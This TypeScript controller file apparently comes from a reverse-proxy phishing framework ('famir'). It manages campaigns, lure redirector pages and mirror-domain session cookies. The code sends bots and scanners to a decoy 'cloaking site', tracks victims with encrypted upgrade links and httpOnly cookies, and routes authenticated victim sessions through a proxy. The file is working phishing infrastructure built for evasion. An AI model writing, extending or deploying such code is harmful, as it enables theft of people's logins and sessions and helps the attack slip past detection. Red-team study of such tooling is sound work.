import { decrypt, DIContainer, encrypt, randomName } from '@famir/common'
import {
  EnabledFullTargetModel,
  EnabledLureModel,
  FullCampaignModel,
  FullRedirectorModel,
  SessionModel
} from '@famir/database'
import {
  HTTP_SERVER_ROUTER,
  HttpServerContext,
  HttpServerNextFunction,
  HttpServerRouter
} from '@famir/http-server'
import { HttpCookie } from '@famir/http-tools'
import { Logger, LOGGER } from '@famir/logger'
import { TEMPLATER, Templater } from '@famir/templater'
import { Validator, VALIDATOR } from '@famir/validator'
import {
  AUTH_SESSION_USE_CASE,
  type AuthSessionUseCase,
  CREATE_SESSION_USE_CASE,
  type CreateSessionUseCase,
  FIND_LURE_REDIRECTOR_USE_CASE,
  type FindLureRedirectorUseCase,
  READ_PROXY_USE_CASE,
  type ReadProxyUseCase,
  UPGRADE_SESSION_USE_CASE,
  type UpgradeSessionUseCase
} from '../../use-cases/index.js'
import { BaseController } from '../base/index.js'
import { LandingLureData, LandingUpgradeData } from './authorize.js'
import { authorizeSchemas } from './authorize.schemas.js'

export const AUTHORIZE_CONTROLLER = Symbol('AuthorizeController')

export class AuthorizeController extends BaseController {
  static inject(container: DIContainer) {
    container.registerSingleton(
      AUTHORIZE_CONTROLLER,
      (c) =>
        new AuthorizeController(
          c.resolve<Validator>(VALIDATOR),
          c.resolve<Logger>(LOGGER),
          c.resolve<Templater>(TEMPLATER),
          c.resolve<HttpServerRouter>(HTTP_SERVER_ROUTER),
          c.resolve<ReadProxyUseCase>(READ_PROXY_USE_CASE),
          c.resolve<FindLureRedirectorUseCase>(FIND_LURE_REDIRECTOR_USE_CASE),
          c.resolve<CreateSessionUseCase>(CREATE_SESSION_USE_CASE),
          c.resolve<AuthSessionUseCase>(AUTH_SESSION_USE_CASE),
          c.resolve<UpgradeSessionUseCase>(UPGRADE_SESSION_USE_CASE)
        )
    )
  }

  static resolve(container: DIContainer): AuthorizeController {
    return container.resolve(AUTHORIZE_CONTROLLER)
  }

  constructor(
    validator: Validator,
    logger: Logger,
    protected templater: Templater,
    router: HttpServerRouter,
    protected readonly readProxyUseCase: ReadProxyUseCase,
    protected readonly findLureRedirectorUseCase: FindLureRedirectorUseCase,
    protected readonly createSessionUseCase: CreateSessionUseCase,
    protected readonly authSessionUseCase: AuthSessionUseCase,
    protected readonly upgradeSessionUseCase: UpgradeSessionUseCase
  ) {
    super(validator, logger, router)

    this.validator.addSchemas(authorizeSchemas)

    this.logger.debug(`AuthorizeController initialized`)
  }

  use() {
    this.router.addMiddleware('authorize', async (ctx, next) => {
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')

      if (target.isLanding) {
        if (ctx.url.isPath(campaign.landingUpgradePath)) {
          await this.landingUpgradeSession(ctx, campaign, target)

          return
        }

        const lureRedirector = await this.findLureRedirectorUseCase.execute({
          campaignId: campaign.campaignId,
          path: ctx.url.get('pathname')
        })

        if (lureRedirector) {
          await this.landingLureSession(ctx, campaign, target, lureRedirector)

          return
        }

        await this.landingAuthSession(ctx, campaign, target, next)
      } else {
        await this.transparentSession(ctx, campaign, target, next)
      }
    })
  }

  protected async landingUpgradeSession(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    target: EnabledFullTargetModel
  ): Promise<void> {
    if (!ctx.method.is('GET')) {
      await this.sendNotFoundPage(ctx, target)

      return
    }

    const upgradeData = this.parseLandingUpgradeData(ctx, campaign)
    if (!upgradeData) {
      await this.sendNotFoundPage(ctx, target)

      return
    }

    if (ctx.isBot) {
      await this.sendNotFoundPage(ctx, target)

      return
    }

    const isOkey = await this.upgradeSessionUseCase.execute({
      campaignId: campaign.campaignId,
      lureId: upgradeData.lure_id,
      sessionId: upgradeData.session_id,
      secret: upgradeData.secret
    })

    if (!isOkey) {
      await this.sendNotFoundPage(ctx, target)

      return
    }

    await this.sendRedirectTo(ctx, upgradeData.back_url)
  }

  protected async landingLureSession(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    target: EnabledFullTargetModel,
    lureRedirector: [EnabledLureModel, FullRedirectorModel]
  ): Promise<void> {
    if (!ctx.method.is(['GET', 'HEAD'])) {
      await this.sendNotFoundPage(ctx, target)

      return
    }

    const lureData = this.parseLandingLureData(ctx, campaign)
    if (!lureData) {
      await this.sendNotFoundPage(ctx, target)

      return
    }

    if (ctx.isBot) {
      await this.sendRedirectorPage(ctx, campaign, target, lureRedirector, null, lureData)

      return
    }

    const sessionCookie = this.getSessionCookie(ctx, campaign)
    if (!sessionCookie) {
      const session = await this.createSessionUseCase.execute({
        campaignId: campaign.campaignId
      })

      this.persistSessionCookie(ctx, campaign, session)

      await this.sendOriginRedirect(ctx)

      return
    }

    if (!this.checkSessionCookie(sessionCookie)) {
      this.removeSessionCookie(ctx, campaign)

      await this.sendOriginRedirect(ctx)

      return
    }

    const session = await this.authSessionUseCase.execute({
      campaignId: campaign.campaignId,
      sessionId: sessionCookie
    })

    if (!session) {
      this.removeSessionCookie(ctx, campaign)

      await this.sendOriginRedirect(ctx)

      return
    }

    this.persistSessionCookie(ctx, campaign, session)

    await this.sendRedirectorPage(ctx, campaign, target, lureRedirector, session, lureData)
  }

  protected async landingAuthSession(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    target: EnabledFullTargetModel,
    next: HttpServerNextFunction
  ): Promise<void> {
    if (ctx.isBot) {
      await this.sendCloakingSite(ctx, target)

      return
    }

    const sessionCookie = this.getSessionCookie(ctx, campaign)
    if (!sessionCookie) {
      await this.sendCloakingSite(ctx, target)

      return
    }

    if (!this.checkSessionCookie(sessionCookie)) {
      this.removeSessionCookie(ctx, campaign)

      await this.sendOriginRedirect(ctx)

      return
    }

    const session = await this.authSessionUseCase.execute({
      campaignId: campaign.campaignId,
      sessionId: sessionCookie
    })

    if (!session) {
      this.removeSessionCookie(ctx, campaign)

      await this.sendOriginRedirect(ctx)

      return
    }

    this.persistSessionCookie(ctx, campaign, session)

    if (!session.isLanding) {
      await this.sendCloakingSite(ctx, target)

      return
    }

    const proxy = await this.readProxyUseCase.execute({
      campaignId: campaign.campaignId,
      proxyId: session.proxyId
    })

    this.setState(ctx, 'proxy', proxy)
    this.setState(ctx, 'session', session)

    if (ctx.verbose) {
      ctx.responseHeaders.merge({
        'X-Famir-Session-Id': session.sessionId,
        'X-Famir-Proxy-Id': proxy.proxyId
      })
    }

    await next()
  }

  protected async transparentSession(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    target: EnabledFullTargetModel,
    next: HttpServerNextFunction
  ): Promise<void> {
    if (ctx.isBot) {
      await this.sendCloakingSite(ctx, target)

      return
    }

    let session: SessionModel | null = null

    const sessionCookie = this.getSessionCookie(ctx, campaign)
    if (sessionCookie && this.checkSessionCookie(sessionCookie)) {
      session = await this.authSessionUseCase.execute({
        campaignId: campaign.campaignId,
        sessionId: sessionCookie
      })
    }

    if (!session) {
      session = await this.createSessionUseCase.execute({
        campaignId: campaign.campaignId
      })
    }

    this.persistSessionCookie(ctx, campaign, session)

    const proxy = await this.readProxyUseCase.execute({
      campaignId: campaign.campaignId,
      proxyId: session.proxyId
    })

    this.setState(ctx, 'proxy', proxy)
    this.setState(ctx, 'session', session)

    if (ctx.verbose) {
      ctx.responseHeaders.merge({
        'X-Famir-Session-Id': session.sessionId,
        'X-Famir-Proxy-Id': proxy.proxyId
      })
    }

    await next()
  }

  private getSessionCookie(
    ctx: HttpServerContext,
    campaign: FullCampaignModel
  ): HttpCookie | undefined {
    const cookies = ctx.requestHeaders.getCookies()

    return cookies ? cookies[campaign.sessionCookieName] : undefined
  }

  private checkSessionCookie(value: unknown): value is string {
    return this.validator.guardSchema<string>('reverse-session-cookie', value)
  }

  private persistSessionCookie(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    session: SessionModel
  ) {
    const setCookies = ctx.responseHeaders.getSetCookies() ?? {}

    setCookies[campaign.sessionCookieName] = {
      value: session.sessionId,
      domain: '.' + campaign.mirrorDomain,
      path: '/',
      httpOnly: true,
      maxAge: Math.round(campaign.sessionExpire / 1000)
    }

    ctx.responseHeaders.setSetCookies(setCookies)
  }

  private removeSessionCookie(ctx: HttpServerContext, campaign: FullCampaignModel) {
    const setCookies = ctx.responseHeaders.getSetCookies() ?? {}

    setCookies[campaign.sessionCookieName] = {
      value: '',
      domain: '.' + campaign.mirrorDomain,
      path: '/',
      httpOnly: true,
      maxAge: 0
    }

    ctx.responseHeaders.setSetCookies(setCookies)
  }

  private parseLandingUpgradeData(
    ctx: HttpServerContext,
    campaign: FullCampaignModel
  ): LandingUpgradeData | null {
    try {
      const params = ctx.url.getQueryString()
      const value = Object.values(params)[0]

      if (!(value && typeof value === 'string')) {
        return null
      }

      const data: unknown = JSON.parse(decrypt(value, campaign.cryptSecret))

      this.validator.assertSchema<LandingUpgradeData>('reverse-landing-upgrade-data', data)

      return data
    } catch {
      return null
    }
  }

  private parseLandingLureData(
    ctx: HttpServerContext,
    campaign: FullCampaignModel
  ): LandingLureData | null {
    try {
      const params = ctx.url.getQueryString()
      const value = Object.values(params)[0]

      if (!(value && typeof value === 'string')) {
        return null
      }

      const data: unknown = JSON.parse(decrypt(value, campaign.cryptSecret))

      this.validator.assertSchema<LandingLureData>('reverse-landing-lure-data', data)

      return data
    } catch {
      return null
    }
  }

  protected async sendCloakingSite(
    ctx: HttpServerContext,
    target: EnabledFullTargetModel
  ): Promise<void> {
    if (ctx.url.isPath('/')) {
      await this.sendMainPage(ctx, target)
    } else {
      await this.sendNotFoundPage(ctx, target)
    }
  }

  protected async sendRedirectorPage(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    target: EnabledFullTargetModel,
    lureRedirector: [EnabledLureModel, FullRedirectorModel],
    session: SessionModel | null,
    lureData: LandingLureData
  ): Promise<void> {
    if (ctx.method.is(['GET', 'HEAD'])) {
      const [lure, redirector] = lureRedirector

      ctx.status.set(200)

      if (session) {
        const upgradeData: LandingUpgradeData = {
          lure_id: lure.lureId,
          session_id: session.sessionId,
          secret: session.secret,
          back_url: lureData['back_url'] ?? '/'
        }

        const payload = encrypt(JSON.stringify(upgradeData), campaign.cryptSecret)

        const upgradeUrl = [campaign.landingUpgradePath, '?', randomName(), '=', payload].join('')

        const redirectorPage = this.templater.render(redirector.page, {
          ...lureData,
          upgrade_url: upgradeUrl
        })

        ctx.responseBody.setText(redirectorPage)
      } else {
        const redirectorPage = this.templater.render(redirector.page, {
          ...lureData
        })

        ctx.responseBody.setText(redirectorPage)
      }

      ctx.responseHeaders.merge({
        'Content-Type': 'text/html',
        'Content-Length': ctx.responseBody.length.toString(),
        'Last-Modified': redirector.updatedAt.toUTCString(),
        'Cache-Control': 'public, max-age=86400'
      })

      if (ctx.method.is('HEAD')) {
        ctx.responseBody.reset()
      }

      await ctx.sendResponse()
    } else {
      await this.sendNotFoundPage(ctx, target)
    }
  }
}
